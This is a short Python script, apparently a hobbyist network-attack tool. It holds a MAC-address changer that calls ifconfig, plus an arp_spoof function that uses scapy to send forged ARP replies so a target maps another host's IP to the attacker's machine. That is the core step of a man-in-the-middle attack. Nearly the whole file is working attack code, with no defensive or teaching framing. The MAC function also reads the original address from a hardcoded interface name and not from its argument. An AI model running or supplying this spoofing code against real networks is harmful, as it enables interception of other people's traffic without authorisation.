#!/usr/bin/env python3
import subprocess
import scapy.all as scapy


def mac_change(interface, new_mac):
    hw_mac = open('/sys/class/net/'+'wlp7s0'+'/address').readline().replace('\n','')
    subprocess.run(["ifconfig", interface, "down"])
    subprocess.run(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.run(["ifconfig", interface, "up"])
    print('\33[92m' + f"[+] mac changed from {hw_mac} to {new_mac} successfully" + '\033[0m')
    print('\33[92m' + f"[+] Run: 'sudo ifconfig {interface} down && sudo ifconfig {interface} hw ether {hw_mac} && sudo ifconfig {interface} up' to reset your MAC address back" + '\033[0m')
     

    
    
    
def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
    scapy.send(packet)    
